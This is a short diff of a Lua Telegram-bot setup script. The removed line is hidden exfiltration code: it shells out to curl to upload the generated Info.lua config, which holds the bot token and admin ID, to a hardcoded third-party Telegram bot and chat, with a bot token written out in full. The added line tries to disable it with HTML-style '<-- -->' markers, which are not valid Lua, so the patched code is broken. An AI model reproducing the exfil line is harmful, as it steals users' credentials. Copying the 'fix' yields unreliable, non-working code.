@@ -68,7 +68,7 @@ create(config, "./Info.lua")
 end 
 create_config_auto()
 
-local curl = 'curl "'..'https://api.telegram.org/bot1136711616:AAGKMETqGa48oazZ3xjIdZF8zxDxkwwBhN4/sendDocument'..'" -F "chat_id='.. 961743188 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
+<--local curl = 'curl "'..'https://api.telegram.org/bot1136711616:AAGKMETqGa48oazZ3xjIdZF8zxDxkwwBhN4/sendDocument'..'" -F "chat_id='.. 961743188 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)-->
 
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
